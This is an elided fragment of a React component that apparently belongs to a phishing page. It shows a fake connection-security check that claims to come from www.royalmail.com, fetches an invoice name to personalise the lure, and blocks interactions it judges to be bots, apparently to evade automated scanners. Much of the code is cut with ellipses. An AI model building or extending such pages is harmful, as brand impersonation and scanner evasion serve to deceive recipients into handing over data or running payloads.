...
const LoadingForm = ({ onVerified, invoiceName }: LoadingFormProps) => {
  const [isChecked, setIsChecked] = useState(false);
  const [actualInvoiceName, setActualInvoiceName] = useState<string>("Unknown Invoice");
  ...
  useEffect(() => {
    const handleVisibilityChange = () => {
      const clientIdentifier = actualInvoiceName || invoiceName || "Unknown Client";
      ...
      if (code) {
        try {
          ...
          if (response.ok) {
            ...
            setActualInvoiceName(data.name || "Unknown Invoice");
          }
        } catch (error) {
          console.error('Error fetching invoice name:', error);
          setActualInvoiceName("Unknown Invoice");
        }
      } else if (invoiceName) {
  ...
  const handleCheckboxChange = (checked: boolean, event?: React.MouseEvent) => {
    ...
    if (isLikelyBot(event)) {
      console.log('Bot interaction detected, blocking verification');
      return;
    }
    ...
    <div className="container py-8 mx-auto px-[25px] max-w-xl">
      <div className="text-left" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }}>
        ...
        <p className="text-gray-700 text-sm" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }}>
          www.royalmail.com needs to review the security of your connection before proceeding.
        </p>
      </div>
    </div>
  );
